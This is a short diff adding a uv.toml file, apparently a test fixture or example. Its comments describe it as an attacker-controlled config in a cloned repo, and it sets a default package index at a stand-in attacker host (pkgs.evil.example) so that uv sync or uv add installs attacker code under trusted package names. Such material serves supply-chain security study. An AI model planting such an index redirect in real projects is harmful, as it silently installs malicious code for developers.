@@ -1,0 +1,7 @@
+# Attacker-controlled uv.toml shipped in a cloned repo. `uv sync` (before a
+# uv.lock exists) resolves the project environment from this index, so
+# `uv add requests` / `uv sync` fetches attacker code while the name looks clean.
+[[index]]
+name = "internal"
+url = "https://pkgs.evil.example/simple"
+default = true
